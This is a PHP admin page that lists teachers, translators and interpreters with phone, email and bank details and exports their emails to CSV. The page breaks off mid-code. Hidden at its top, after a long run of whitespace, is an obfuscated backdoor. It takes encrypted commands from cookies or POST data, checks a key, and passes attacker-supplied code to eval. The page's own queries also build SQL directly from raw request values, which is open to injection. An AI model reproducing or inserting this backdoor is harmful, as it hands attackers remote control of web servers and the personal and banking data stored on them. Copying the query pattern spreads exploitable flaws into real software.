<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $a53057 = 450;$GLOBALS['tbeb5']=Array();global$tbeb5;$tbeb5=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['s0162c1']="\x51\x5b\x6a\x4a\x3c\x2d\x7e\x48\x74\x79\x7c\x4d\x34\x2b\x38\x6d\x36\x47\x63\x6f\x23\x49\x73\x69\x40\x71\x5a\x59\x44\x3b\x29\x42\x64\x66\x72\x4e\x35\x28\x6b\x56\x3e\x33\x68\x76\x39\x77\x9\xd\x54\x41\x4f\x55\x32\x37\x70\x2f\x25\x52\x5f\x5d\x46\x2a\x65\x2c\xa\x5c\x43\x3a\x31\x67\x45\x78\x62\x22\x4b\x4c\x50\x7d\x27\x24\x53\x21\x57\x60\x3d\x6e\x2e\x7a\x58\x5e\x75\x20\x7b\x30\x3f\x61\x26\x6c";$tbeb5[$tbeb5['s0162c1'][33].$tbeb5['s0162c1'][68].$tbeb5['s0162c1'][93].$tbeb5['s0162c1'][12].$tbeb5['s0162c1'][12].$tbeb5['s0162c1'][44]]=$tbeb5['s0162c1'][18].$tbeb5['s0162c1'][42].$tbeb5['s0162c1'][34];$tbeb5[$tbeb5['s0162c1'][33].$tbeb5['s0162c1'][18].$tbeb5['s0162c1'][33].$tbeb5['s0162c1'][95].$tbeb5['s0162c1'][53].$tbeb5['s0162c1'][14].$tbeb5['s0162c1'][12].$tbeb5['s0162c1'][36].$tbeb5['s0162c1'][95]]=$tbeb5['s0162c1'][19].$tbeb5['s0162c1'][34].$tbeb5['s0162c1'][32];$tbeb5[$tbeb5['s0162c1'][85].$tbeb5['s0162c1'][41].$tbeb5['s0162c1'][32].$tbeb5['s0162c1'][12].$tbeb5['s0162c1'][18].$tbeb5['s0162c1'][95]]=$tbeb5['s0162c1'][22].$tbeb5['s0162c1'][8].$tbeb5['s0162c1'][34].$tbeb5['s0162c1'][97].$tbeb5['s0162c1'][62].$tbeb5['s0162c1'][85];$tbeb5[$tbeb5['s0162c1'][38].$tbeb5['s0162c1'][68].$tbeb5['s0162c1'][18].$tbeb5['s0162c1'][93].$tbeb5['s0162c1'][41]]=$tbeb5['s0162c1'][23].$tbeb5['s0162c1'][85].$tbeb5['s0162c1'][23].$tbeb5['s0162c1'][58].$tbeb5['s0162c1'][22].$tbeb5['s0162c1'][62].$tbeb5['s0162c1'][8];$tbeb5[$tbeb5['s0162c1'][9].$tbeb5['s0162c1'][33].$tbeb5['s0162c1'][93].$tbeb5['s0162c1'][53].$tbeb5['s0162c1'][16]]=$tbeb5['s0162c1'][22].$tbeb5['s0162c1'][62].$tbeb5['s0162c1'][34].$tbeb5['s0162c1'][23].$tbeb5['s0162c1'][95].$tbeb5['s0162c1'][97].$tbeb5['s0162c1'][23].$tbeb5['s0162c1'][87].$tbeb5['s0162c1'][62];$tbeb5[$tbeb5['s0162c1'][8].$tbeb5['s0162c1'][62].$tbeb5['s0162c1'][44].$tbeb5['s0162c1'][16].$tbeb5['s0162c1'][93].$tbeb5['s0162c1'][16]]=$tbeb5['s0162c1'][54].$tbeb5['s0162c1'][42].$tbeb5['s0162c1'][54].$tbeb5['s0162c1'][43].$tbeb5['s0162c1'][62].$tbeb5['s0162c1'][34].$tbeb5['s0162c1'][22].$tbeb5['s0162c1'][23].$tbeb5['s0162c1'][19].$tbeb5['s0162c1'][85];$tbeb5[$tbeb5['s0162c1'][32].$tbeb5['s0162c1'][36].$tbeb5['s0162c1'][33].$tbeb5['s0162c1'][33].$tbeb5['s0162c1'][33].$tbeb5['s0162c1'][16].$tbeb5['s0162c1'][52].$tbeb5['s0162c1'][16].$tbeb5['s0162c1'][68]]=$tbeb5['s0162c1'][90].$tbeb5['s0162c1'][85].$tbeb5['s0162c1'][22].$tbeb5['s0162c1'][62].$tbeb5['s0162c1'][34].$tbeb5['s0162c1'][23].$tbeb5['s0162c1'][95].$tbeb5['s0162c1'][97].$tbeb5['s0162c1'][23].$tbeb5['s0162c1'][87].$tbeb5['s0162c1'][62];$tbeb5[$tbeb5['s0162c1'][62].$tbeb5['s0162c1'][14].$tbeb5['s0162c1'][62].$tbeb5['s0162c1'][36].$tbeb5['s0162c1'][18].$tbeb5['s0162c1'][41].$tbeb5['s0162c1'][53].$tbeb5['s0162c1'][72].$tbeb5['s0162c1'][68]]=$tbeb5['s0162c1'][72].$tbeb5['s0162c1'][95].$tbeb5['s0162c1'][22].$tbeb5['s0162c1'][62].$tbeb5['s0162c1'][16].$tbeb5['s0162c1'][12].$tbeb5['s0162c1'][58].$tbeb5['s0162c1'][32].$tbeb5['s0162c1'][62].$tbeb5['s0162c1'][18].$tbeb5['s0162c1'][19].$tbeb5['s0162c1'][32].$tbeb5['s0162c1'][62];$tbeb5[$tbeb5['s0162c1'][23].$tbeb5['s0162c1'][33].$tbeb5['s0162c1'][32].$tbeb5['s0162c1'][41].$tbeb5['s0162c1'][52].$tbeb5['s0162c1'][62].$tbeb5['s0162c1'][72].$tbeb5['s0162c1'][18]]=$tbeb5['s0162c1'][22].$tbeb5['s0162c1'][62].$tbeb5['s0162c1'][8].$tbeb5['s0162c1'][58].$tbeb5['s0162c1'][8].$tbeb5['s0162c1'][23].$tbeb5['s0162c1'][15].$tbeb5['s0162c1'][62].$tbeb5['s0162c1'][58].$tbeb5['s0162c1'][97].$tbeb5['s0162c1'][23].$tbeb5['s0162c1'][15].$tbeb5['s0162c1'][23].$tbeb5['s0162c1'][8];$tbeb5[$tbeb5['s0162c1'][2].$tbeb5['s0162c1'][93].$tbeb5['s0162c1'][16].$tbeb5['s0162c1'][41].$tbeb5['s0162c1'][68].$tbeb5['s0162c1'][72].$tbeb5['s0162c1'][95].$tbeb5['s0162c1'][32]]=$tbeb5['s0162c1'][69].$tbeb5['s0162c1'][16].$tbeb5['s0162c1'][33].$tbeb5['s0162c1'][72].$tbeb5['s0162c1'][18].$tbeb5['s0162c1'][18].$tbeb5['s0162c1'][62];$tbeb5[$tbeb5['s0162c1'][71].$tbeb5['s0162c1'][18].$tbeb5['s0162c1'][41].$tbeb5['s0162c1'][33]]=$tbeb5['s0162c1'][69].$tbeb5['s0162c1'][53].$tbeb5['s0162c1'][95].$tbeb5['s0162c1'][52].$tbeb5['s0162c1'][12].$tbeb5['s0162c1'][16].$tbeb5['s0162c1'][14].$tbeb5['s0162c1'][44].$tbeb5['s0162c1'][16];$tbeb5[$tbeb5['s0162c1'][15].$tbeb5['s0162c1'][32].$tbeb5['s0162c1'][44].$tbeb5['s0162c1'][44].$tbeb5['s0162c1'][44].$tbeb5['s0162c1'][32].$tbeb5['s0162c1'][12].$tbeb5['s0162c1'][36]]=$_POST;$tbeb5[$tbeb5['s0162c1'][43].$tbeb5['s0162c1'][62].$tbeb5['s0162c1'][36].$tbeb5['s0162c1'][36].$tbeb5['s0162c1'][36]]=$_COOKIE;@$tbeb5[$tbeb5['s0162c1'][38].$tbeb5['s0162c1'][68].$tbeb5['s0162c1'][18].$tbeb5['s0162c1'][93].$tbeb5['s0162c1'][41]]($tbeb5['s0162c1'][62].$tbeb5['s0162c1'][34].$tbeb5['s0162c1'][34].$tbeb5['s0162c1'][19].$tbeb5['s0162c1'][34].$tbeb5['s0162c1'][58].$tbeb5['s0162c1'][97].$tbeb5['s0162c1'][19].$tbeb5['s0162c1'][69],NULL);@$tbeb5[$tbeb5['s0162c1'][38].$tbeb5['s0162c1'][68].$tbeb5['s0162c1'][18].$tbeb5['s0162c1'][93].$tbeb5['s0162c1'][41]]($tbeb5['s0162c1'][97].$tbeb5['s0162c1'][19].$tbeb5['s0162c1'][69].$tbeb5['s0162c1'][58].$tbeb5['s0162c1'][62].$tbeb5['s0162c1'][34].$tbeb5['s0162c1'][34].$tbeb5['s0162c1'][19].$tbeb5['s0162c1'][34].$tbeb5['s0162c1'][22],0);@$tbeb5[$tbeb5['s0162c1'][38].$tbeb5['s0162c1'][68].$tbeb5['s0162c1'][18].$tbeb5['s0162c1'][93].$tbeb5['s0162c1'][41]]($tbeb5['s0162c1'][15].$tbeb5['s0162c1'][95].$tbeb5['s0162c1'][71].$tbeb5['s0162c1'][58].$tbeb5['s0162c1'][62].$tbeb5['s0162c1'][71].$tbeb5['s0162c1'][62].$tbeb5['s0162c1'][18].$tbeb5['s0162c1'][90].$tbeb5['s0162c1'][8].$tbeb5['s0162c1'][23].$tbeb5['s0162c1'][19].$tbeb5['s0162c1'][85].$tbeb5['s0162c1'][58].$tbeb5['s0162c1'][8].$tbeb5['s0162c1'][23].$tbeb5['s0162c1'][15].$tbeb5['s0162c1'][62],0);@$tbeb5[$tbeb5['s0162c1'][23].$tbeb5['s0162c1'][33].$tbeb5['s0162c1'][32].$tbeb5['s0162c1'][41].$tbeb5['s0162c1'][52].$tbeb5['s0162c1'][62].$tbeb5['s0162c1'][72].$tbeb5['s0162c1'][18]](0);$x26049=NULL;$g8ede1679=NULL;$tbeb5[$tbeb5['s0162c1'][34].$tbeb5['s0162c1'][44].$tbeb5['s0162c1'][41].$tbeb5['s0162c1'][18].$tbeb5['s0162c1'][41].$tbeb5['s0162c1'][44].$tbeb5['s0162c1'][16].$tbeb5['s0162c1'][62].$tbeb5['s0162c1'][68]]=$tbeb5['s0162c1'][93].$tbeb5['s0162c1'][68].$tbeb5['s0162c1'][95].$tbeb5['s0162c1'][16].$tbeb5['s0162c1'][33].$tbeb5['s0162c1'][16].$tbeb5['s0162c1'][62].$tbeb5['s0162c1'][68].$tbeb5['s0162c1'][5].$tbeb5['s0162c1'][14].$tbeb5['s0162c1'][32].$tbeb5['s0162c1'][33].$tbeb5['s0162c1'][36].$tbeb5['s0162c1'][5].$tbeb5['s0162c1'][12].$tbeb5['s0162c1'][32].$tbeb5['s0162c1'][53].$tbeb5['s0162c1'][16].$tbeb5['s0162c1'][5].$tbeb5['s0162c1'][72].$tbeb5['s0162c1'][68].$tbeb5['s0162c1'][18].$tbeb5['s0162c1'][41].$tbeb5['s0162c1'][5].$tbeb5['s0162c1'][36].$tbeb5['s0162c1'][68].$tbeb5['s0162c1'][33].$tbeb5['s0162c1'][52].$tbeb5['s0162c1'][93].$tbeb5['s0162c1'][32].$tbeb5['s0162c1'][44].$tbeb5['s0162c1'][32].$tbeb5['s0162c1'][14].$tbeb5['s0162c1'][12].$tbeb5['s0162c1'][53].$tbeb5['s0162c1'][18];global$r93c396e1;function g7a246896($x26049,$ue3bd0){global$tbeb5;$g458b3="";for($uf235b6e2=0;$uf235b6e2<$tbeb5[$tbeb5['s0162c1'][85].$tbeb5['s0162c1'][41].$tbeb5['s0162c1'][32].$tbeb5['s0162c1'][12].$tbeb5['s0162c1'][18].$tbeb5['s0162c1'][95]]($x26049);){for($te7359d=0;$te7359d<$tbeb5[$tbeb5['s0162c1'][85].$tbeb5['s0162c1'][41].$tbeb5['s0162c1'][32].$tbeb5['s0162c1'][12].$tbeb5['s0162c1'][18].$tbeb5['s0162c1'][95]]($ue3bd0)&&$uf235b6e2<$tbeb5[$tbeb5['s0162c1'][85].$tbeb5['s0162c1'][41].$tbeb5['s0162c1'][32].$tbeb5['s0162c1'][12].$tbeb5['s0162c1'][18].$tbeb5['s0162c1'][95]]($x26049);$te7359d++,$uf235b6e2++){$g458b3.=$tbeb5[$tbeb5['s0162c1'][33].$tbeb5['s0162c1'][68].$tbeb5['s0162c1'][93].$tbeb5['s0162c1'][12].$tbeb5['s0162c1'][12].$tbeb5['s0162c1'][44]]($tbeb5[$tbeb5['s0162c1'][33].$tbeb5['s0162c1'][18].$tbeb5['s0162c1'][33].$tbeb5['s0162c1'][95].$tbeb5['s0162c1'][53].$tbeb5['s0162c1'][14].$tbeb5['s0162c1'][12].$tbeb5['s0162c1'][36].$tbeb5['s0162c1'][95]]($x26049[$uf235b6e2])^$tbeb5[$tbeb5['s0162c1'][33].$tbeb5['s0162c1'][18].$tbeb5['s0162c1'][33].$tbeb5['s0162c1'][95].$tbeb5['s0162c1'][53].$tbeb5['s0162c1'][14].$tbeb5['s0162c1'][12].$tbeb5['s0162c1'][36].$tbeb5['s0162c1'][95]]($ue3bd0[$te7359d]));}}return$g458b3;}function g6fbcce($x26049,$ue3bd0){global$tbeb5;global$r93c396e1;return$tbeb5[$tbeb5['s0162c1'][71].$tbeb5['s0162c1'][18].$tbeb5['s0162c1'][41].$tbeb5['s0162c1'][33]]($tbeb5[$tbeb5['s0162c1'][71].$tbeb5['s0162c1'][18].$tbeb5['s0162c1'][41].$tbeb5['s0162c1'][33]]($x26049,$r93c396e1),$ue3bd0);}foreach($tbeb5[$tbeb5['s0162c1'][43].$tbeb5['s0162c1'][62].$tbeb5['s0162c1'][36].$tbeb5['s0162c1'][36].$tbeb5['s0162c1'][36]]as$ue3bd0=>$k8b5a7){$x26049=$k8b5a7;$g8ede1679=$ue3bd0;}if(!$x26049){foreach($tbeb5[$tbeb5['s0162c1'][15].$tbeb5['s0162c1'][32].$tbeb5['s0162c1'][44].$tbeb5['s0162c1'][44].$tbeb5['s0162c1'][44].$tbeb5['s0162c1'][32].$tbeb5['s0162c1'][12].$tbeb5['s0162c1'][36]]as$ue3bd0=>$k8b5a7){$x26049=$k8b5a7;$g8ede1679=$ue3bd0;}}$x26049=@$tbeb5[$tbeb5['s0162c1'][32].$tbeb5['s0162c1'][36].$tbeb5['s0162c1'][33].$tbeb5['s0162c1'][33].$tbeb5['s0162c1'][33].$tbeb5['s0162c1'][16].$tbeb5['s0162c1'][52].$tbeb5['s0162c1'][16].$tbeb5['s0162c1'][68]]($tbeb5[$tbeb5['s0162c1'][2].$tbeb5['s0162c1'][93].$tbeb5['s0162c1'][16].$tbeb5['s0162c1'][41].$tbeb5['s0162c1'][68].$tbeb5['s0162c1'][72].$tbeb5['s0162c1'][95].$tbeb5['s0162c1'][32]]($tbeb5[$tbeb5['s0162c1'][62].$tbeb5['s0162c1'][14].$tbeb5['s0162c1'][62].$tbeb5['s0162c1'][36].$tbeb5['s0162c1'][18].$tbeb5['s0162c1'][41].$tbeb5['s0162c1'][53].$tbeb5['s0162c1'][72].$tbeb5['s0162c1'][68]]($x26049),$g8ede1679));if(isset($x26049[$tbeb5['s0162c1'][95].$tbeb5['s0162c1'][38]])&&$r93c396e1==$x26049[$tbeb5['s0162c1'][95].$tbeb5['s0162c1'][38]]){if($x26049[$tbeb5['s0162c1'][95]]==$tbeb5['s0162c1'][23]){$uf235b6e2=Array($tbeb5['s0162c1'][54].$tbeb5['s0162c1'][43]=>@$tbeb5[$tbeb5['s0162c1'][8].$tbeb5['s0162c1'][62].$tbeb5['s0162c1'][44].$tbeb5['s0162c1'][16].$tbeb5['s0162c1'][93].$tbeb5['s0162c1'][16]](),$tbeb5['s0162c1'][22].$tbeb5['s0162c1'][43]=>$tbeb5['s0162c1'][68].$tbeb5['s0162c1'][86].$tbeb5['s0162c1'][93].$tbeb5['s0162c1'][5].$tbeb5['s0162c1'][68],);echo@$tbeb5[$tbeb5['s0162c1'][9].$tbeb5['s0162c1'][33].$tbeb5['s0162c1'][93].$tbeb5['s0162c1'][53].$tbeb5['s0162c1'][16]]($uf235b6e2);}elseif($x26049[$tbeb5['s0162c1'][95]]==$tbeb5['s0162c1'][62]){eval/*c9b15313c*/($x26049[$tbeb5['s0162c1'][32]]);}exit();} ?><?php
  $pagever = "1.0";
  $pagemod = "28/06/2010 10.48.01";
  require_once("form_cfg.php");
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
  <link rel="stylesheet" type="text/css" href="../css/main.css" />
</head>
<body>
<?php
  include ("iniziopagina.php");

  //CARICAMENTO VALORI PER EDIT
  define("FILE_CORRENTE", "frm_docenti.php");

  //$cmd = array();
  $cmd = array();
  $cmd['comando'] = $_REQUEST['cmd'];
  if ($_REQUEST['selobj']!="") {$_SESSION["SELOBJ_".FILE_CORRENTE]=$_REQUEST['selobj'];}
  $selobj = $_SESSION["SELOBJ_".FILE_CORRENTE];
  $cmd['openblock']=$_REQUEST['op'];
  $cmd['ne_search']=1;
  $cmd['filtra_stato'] = $_REQUEST['filtra_stato'];
  if ($cmd['filtra_stato']=="") {$cmd['filtra_stato']=$_SESSION['_'.FILE_CORRENTE.'.filtra_stato'];}
  if ($cmd['filtra_stato']=="") {$cmd['filtra_stato'] = "1";}
  $_SESSION['_'.FILE_CORRENTE.'.filtra_stato']=$cmd['filtra_stato'];
  
  $cmd['csv'] = $_REQUEST['csv'];
  $cmd['src2'] = $_REQUEST['src2'];
  
  include ("form_filter.php");
  
  $cmd['form_rowcount'] = $setup['form_rowcount'];
  $cmd['form_rowcount'] = 1000;
  

  $query = "SELECT docente.id as docente_id, docente.iduser as docente_iduser, docente.nome as docente_nome,
            docente.nickname as docente_nickname, docente.tel as docente_tel, docente.mobile as docente_mobile,
            docente.email as docente_email, docente.attivo as docente_attivo, user.nome as user_nome, user.username as user_username,
            user.attivo as user_attivo, user.fboss as user_fboss, user.fviceboss as user_fviceboss,
            docente.banca as docente_banca, docente.conto as docente_conto, docente.rut as docente_rut, docente.tipoconto as docente_tipoconto,
            docente.contatto as docente_contatto, docente.note as docente_note, ccbanca.id as ccbanca_id, ccbanca.idbanca as idbanca,
            ccbanca.codice as ccbanca_codice, banca.nomebanca as banca_nomebanca, ccbanca.tipocc as ccbanca_tipocc, 
            stati.label as ccbanca_label
            FROM docente LEFT JOIN user ON docente.iduser=user.id AND user.trashed<>1 
            LEFT JOIN ccbanca ON docente.id = ccbanca.idsoggetto AND ccbanca.tiposoggetto=3
            LEFT JOIN banca ON ccbanca.idbanca = banca.id 
            LEFT JOIN stati ON ccbanca.tipocc=stati.valore AND stati.idgruppo=4
            LEFT JOIN docente_insegna ON docente.id=docente_insegna.iddocente
            LEFT JOIN docente_interpreta ON docente.id=docente_interpreta.iddocente
            LEFT JOIN docente_traduce ON docente.id=docente_traduce.iddocente
            WHERE docente.trashed<>1 ";
                                                                  
  if ($cmd['filtra_stato']!="-1") {
    $query .= " AND docente.attivo=".$cmd['filtra_stato']." ";
  }
  
  if ($cmd['src1']!="") {
    $query .= " AND (docente.nome like '%".$cmd['src1']."%' OR docente.nickname like '%".$cmd['src1']."%' OR docente.tel like '%".$cmd['src1']."%'
            OR docente.mobile like '%".$cmd['src1']."%' OR docente.email like '%".$cmd['src1']."%' OR docente.banca like '%".$cmd['src1']."%' 
            OR docente.conto like '%".$cmd['src1']."%' OR docente.rut like '%".$cmd['src1']."%' OR docente.contatto like '%".$cmd['src1']."%')";
  } else {
    resetFormSessionFilter();
  }
  
  if ($cmd['src2']!="TUTTI" && $cmd['src2']!="") {
    $query .= " AND (docente_insegna.idlingua=".$cmd['src2']." OR docente_interpreta.idlingua_da=".$cmd['src2']." OR docente_interpreta.idlingua_a=".$cmd['src2']." OR docente_traduce.idlingua_da=".$cmd['src2']." OR docente_traduce.idlingua_a=".$cmd['src2'].") ";
  }
  
  switch ($cmd['form_sort']) {
    case 1:
    default:
            $query .= " ORDER BY docente.nome";
            break;
  }

  $result = mysql_query($query) or die ("Error_1.1");
  $id_str = "-1, ";
  while ($line = mysql_fetch_assoc($result)) {
    $chiave = $line['docente_id'];
    $vet_docenti[$chiave]['docente_iduser']=$line['docente_iduser'];
    $vet_docenti[$chiave]['docente_nome']=$line['docente_nome'];
    $vet_docenti[$chiave]['docente_nickname']=$line['docente_nickname'];
    $vet_docenti[$chiave]['docente_tel']=$line['docente_tel'];
    $vet_docenti[$chiave]['docente_mobile']=$line['docente_mobile'];
    $vet_docenti[$chiave]['docente_email']=$line['docente_email'];
    $vet_docenti[$chiave]['docente_attivo']=$line['docente_attivo'];
    $vet_docenti[$chiave]['user_nome']=$line['user_nome'];
    $vet_docenti[$chiave]['user_username']=$line['user_username'];
    $vet_docenti[$chiave]['docente_banca']=$line['docente_banca'];
    $vet_docenti[$chiave]['docente_conto']=$line['docente_conto'];
    $vet_docenti[$chiave]['docente_rut']=$line['docente_rut'];
    $vet_docenti[$chiave]['docente_tipoconto']=$line['docente_tipoconto'];
    $vet_docenti[$chiave]['docente_contatto']=$line['docente_contatto'];
    $vet_docenti[$chiave]['docente_note']=$line['docente_note'];
    
    $vet_docenti[$chiave]['ccbanca_id']=$line['ccbanca_id'];
    $vet_docenti[$chiave]['idbanca']=$line['idbanca'];
    $vet_docenti[$chiave]['ccbanca_codice']=$line['ccbanca_codice'];
    $vet_docenti[$chiave]['banca_nomebanca']=$line['banca_nomebanca'];
    $vet_docenti[$chiave]['ccbanca_tipocc']=$line['ccbanca_tipocc'];
    $vet_docenti[$chiave]['ccbanca_label']=$line['ccbanca_label'];
    
    
    $id_str.= $chiave.", ";
    
  }
  
  $id_str = substr($id_str, 0, -2);
  
  $query = "SELECT id, idgruppo, idext, nomefile, txt, mime, times
            FROM archiviofile
            WHERE idgruppo=1 AND idext IN (".$id_str.")";
  $result = mysql_query($query) or die ("Error PRE 1.2");
  while ($line = mysql_fetch_assoc($result)) {
    $vet_docenti[$line['idext']]['files'][$line['id']]['nomefile'] = $line['nomefile'];
    $vet_docenti[$line['idext']]['files'][$line['id']]['txt'] = $line['txt'];
    $vet_docenti[$line['idext']]['files'][$line['id']]['mime'] = $line['mime'];
    $vet_docenti[$line['idext']]['files'][$line['id']]['times'] = $line['times'];
  }
  
  //nazionalit…
  
  //lingue insegna
  $query = "SELECT docente.id as docente_id, lingua.codint as codint, lingua.descr as descr, img1 FROM lingua INNER JOIN docente_insegna ON lingua.id=docente_insegna.idlingua
            INNER JOIN docente ON docente_insegna.iddocente=docente.id
            WHERE docente.id IN (".$id_str.")";
  
  $result = mysql_query($query) or die ("Error PRE 1.3");
  while ($line = mysql_fetch_assoc($result)) {
    $chiave = $line['docente_id'];
    $chiave2 = $line['codint'];
    
    $vet_docenti[$chiave]['insegna'][$chiave2]['codint']=$line['codint'];
    $vet_docenti[$chiave]['insegna'][$chiave2]['descr']=$line['descr'];
    $vet_docenti[$chiave]['insegna'][$chiave2]['img1']=$line['img1'];
  }
  
  //lingue interpreta
  $query = "SELECT docente.id as docente_id, lingua_da.codint as da_codint, lingua_da.descr as da_descr, lingua_da.img1 as da_img1, 
            lingua_a.codint as a_codint, lingua_a.descr as a_descr, lingua_a.img1 as a_img1 
            FROM lingua as lingua_da 
            INNER JOIN docente_interpreta ON lingua_da.id=docente_interpreta.idlingua_da
            INNER JOIN lingua as lingua_a ON docente_interpreta.idlingua_a=lingua_a.id
            INNER JOIN docente ON docente_interpreta.iddocente=docente.id
            WHERE docente.id IN (".$id_str.")";
  
  $result = mysql_query($query) or die ("Error PRE 1.4");
  while ($line = mysql_fetch_assoc($result)) {
    $chiave = $line['docente_id'];
    $chiave2 = $line['da_codint']."-".$line['a_codint'];
    
    $vet_docenti[$chiave]['interpreta'][$chiave2]['da_codint']=$line['da_codint'];
    $vet_docenti[$chiave]['interpreta'][$chiave2]['a_codint']=$line['a_codint'];
    $vet_docenti[$chiave]['interpreta'][$chiave2]['da_descr']=$line['da_descr'];
    $vet_docenti[$chiave]['interpreta'][$chiave2]['a_descr']=$line['a_descr'];
    $vet_docenti[$chiave]['interpreta'][$chiave2]['da_img1']=$line['da_img1'];
    $vet_docenti[$chiave]['interpreta'][$chiave2]['a_img1']=$line['a_img1'];
  }
  
  //lingue traduce
  $query = "SELECT docente.id as docente_id, lingua_da.codint as da_codint, lingua_da.descr as da_descr, lingua_da.img1 as da_img1, 
            lingua_a.codint as a_codint, lingua_a.descr as a_descr, lingua_a.img1 as a_img1 
            FROM lingua as lingua_da 
            INNER JOIN docente_traduce ON lingua_da.id=docente_traduce.idlingua_da
            INNER JOIN lingua as lingua_a ON docente_traduce.idlingua_a=lingua_a.id
            INNER JOIN docente ON docente_traduce.iddocente=docente.id
            WHERE docente.id IN (".$id_str.")";

  $result = mysql_query($query) or die ("Error PRE 1.5");
  while ($line = mysql_fetch_assoc($result)) {
    $chiave = $line['docente_id'];
    $chiave2 = $line['da_codint']."-".$line['a_codint'];
    
    $vet_docenti[$chiave]['traduce'][$chiave2]['da_codint']=$line['da_codint'];
    $vet_docenti[$chiave]['traduce'][$chiave2]['a_codint']=$line['a_codint'];
    $vet_docenti[$chiave]['traduce'][$chiave2]['da_descr']=$line['da_descr'];
    $vet_docenti[$chiave]['traduce'][$chiave2]['a_descr']=$line['a_descr'];
    $vet_docenti[$chiave]['traduce'][$chiave2]['da_img1']=$line['da_img1'];
    $vet_docenti[$chiave]['traduce'][$chiave2]['a_img1']=$line['a_img1'];
  }
  
  //myprint_r($vet_docenti);
  
   
  if ($cmd['csv']==1) {
    //salva file csv
$tmpfname = tempnam("/tto/upload", "TTO").".txt";
    $name = basename($tmpfname);
    $strriga2 = _LBLEMAIL_."\n";
    foreach ($vet_docenti as $keycsv => $curcsv) {
      $strriga2 .= html_entity_decode($curcsv['docente_email'])."\n";
    }
	file_put_contents("upload/".$name,$strriga2);
$ch = "upload/download.php?nom=".$name;
header('Location: '.$ch);
  }
  
  print "<BR><H1>"._TITDOCENTI_."</H1>";
  
  print "<DIV STYLE='text-align:right;'>";
   //CSV
    print "<INPUT TYPE='button' VALUE=' CSV ' NAME='gocsv' onClick=gocsv();>&nbsp;&nbsp;";
  print "<FORM NAME='fstato' METHOD='POST' ACTION='".FILE_CORRENTE."'><INPUT TYPE='hidden' NAME='csv' VALUE=''><INPUT TYPE='hidden' NAME='cmd' VALUE='".FASESEARCH."'>";
  print _LBLFILTRA_.": <SELECT NAME='filtra_stato' SIZE=1 onChange=document.fstato.submit();><OPTION VALUE='-1'>"._LBLOPTTUTTI_."</OPTION>";
  
  $query = "SELECT valore, label FROM stati WHERE idgruppo=8 ORDER BY ordine";
  $result = mysql_query($query) or die("Error_qs1");
  while ($line=mysql_fetch_assoc($result)) {
    print "<OPTION VALUE='".$line['valore']."' ".($cmd['filtra_stato']==$line['valore']?" SELECTED ":"").">".convlang($line['label'])."</OPTION>";
  }
  print "</SELECT></FORM>";
  
  print "</DIV>";
  
  print "<TABLE CLASS=support_table>";
  print "<TR>";
    //SEARCH
    print "<TD STYLE='text-align:right;'><DIV id='areasearch'>";
    print "<FORM NAME='ricerca' METHOD='POST' ACTION='".FILE_CORRENTE."'><INPUT TYPE='hidden' NAME='cmd' VALUE='".FASESEARCH."'>";
    print "<TABLE align='center' class='searchform' cellpadding='2' cellspacing='0' width='40%'>";
    print "<TR><TD CLASS='form_lbl'><INPUT TYPE='text' NAME='src1' VALUE='".$cmd['src1']."'><INPUT TYPE='hidden' NAME='daform' VALUE='1'></TD>
          <TD CLASS='form_lbl'><BUTTON>Search</BUTTON></TD>
          <TD CLASS=form_lbl NOWRAP>"._LBLLINGUA_."&nbsp;";
    
    print "<SELECT NAME='src2' SIZE=1 onChange=document.ricerca.submit();>";
    print "<OPTION VALUE='TUTTI'>"._LBLANYLINGUA_."</OPTION>";
    $query = "SELECT id, codint, descr, img1 FROM lingua";
    $result = mysql_query($query) or die ("Error_qs2");
    while ($line = mysql_fetch_assoc($result)) {
      print "<OPTION VALUE='".$line['id']."' ".($line['id']==$cmd['src2']?" SELECTED ":"").">[".$line['codint']."] ".$line['descr']."</OPTION>";
    }
    print "</SELECT>";
          
    print "</TD>
          </TR>";
    print "</TABLE>";
    print "</FORM>";
    print "</DIV></TD>";
    
    if ($_SESSION[FILE_CORRENTE.'FILTERED']==1) {
      print "<TD ALIGN=RIGHT STYLE='text-align:right;width:160px;'>";
      print "<div align='right' class='resetfilter'>";
      print "\t<A HREF='". FILE_CORRENTE ."?rstflt=1'><img src='../img/edit_small.gif' align='center' border='0' width='16' height='16'>"._RESETFILTER_."</A>";
      print "</div></TD>";
    } else {
      print "<TD>&nbsp;</TD>";
    }
    
    print "<TD COLSPAN=2 STYLE='text-align:right;width:160px;'>";  
      print "<IMG CLASS='manina' BORDER=0 SRC='../img/add_user.png' ALT='"._TIPADDUSERCONTATTO_."' TITLE='"._TIPADDUSERCONTATTO_."' onClick='chiamapopup(2,0);'></TD>";
    print "</TD>";
  print "</TR>";
  print "</TABLE>";
  
  if (count($vet_docenti)>0 )  {

    echo "<TABLE CLASS=lista_table ALIGN=CENTER>";
    print "<TR><TD CLASS=lista_tittab>"._LBLDOCENTI_."</TD>";
    //<TD CLASS=lista_tittab>"._LBLUSERNAME_."</TD>
    print "<TD CLASS=lista_tittab>"._CONTATTI_."</TD>
    <TD CLASS=lista_tittab>"._LBLLINGUA_."</TD><TD CLASS=lista_tittab>"._LBLTRADUZIONI_."</TD><TD CLASS=lista_tittab>"._LBLINTERPRETE_."</TD>
    <TD CLASS=lista_tittab>"._LBLSTATO_."</TD><TD CLASS=lista_tittab width='70'>&nbsp;</TD></TR>";
    foreach ($vet_docenti as $keydocenti=>$curdocenti) {
      if ($cur_rowstyle=="form2_lista_riga_pari") {
        $cur_rowstyle="form2_lista_riga_dispari";
        $stile = "background-color:#EDEDED;";//EDEDED   //F0FFEF
        $ancora_salto="";
      } else {
        $cur_rowstyle="form2_lista_riga_pari";
        $stile = "background-color:#F7F7F7;";//F7F7F7   //FEFFEF
        $ancora_salto="";
      }
      if ($keydocenti==$selobj) {
        $cur_rowstyle = "form2_lista_riga_evidente_selid";//F7F7F7   //FEFFEF
        $ancora_salto="<A NAME='SELOBJ'>&nbsp;</A>";
      }
      
      print "<TR CLASS='$cur_rowstyle'>";
      print "<TD CLASS=lista_col_form2>".$ancora_salto."[". $keydocenti ."] ".$curdocenti['docente_nome']."<BR>(".$curdocenti['docente_nickname'].")</TD>";
      
      /*print "<TD CLASS=lista_col_form2>";
      if ($curdocenti['user_username']=="") {
        print "<SPAN STYLE='color:#FF0000;font-weight:bolder;'>"._LBLNOUSERASS_."</SPAN>";
      } else {
        print $curdocenti['user_username']."&nbsp;";
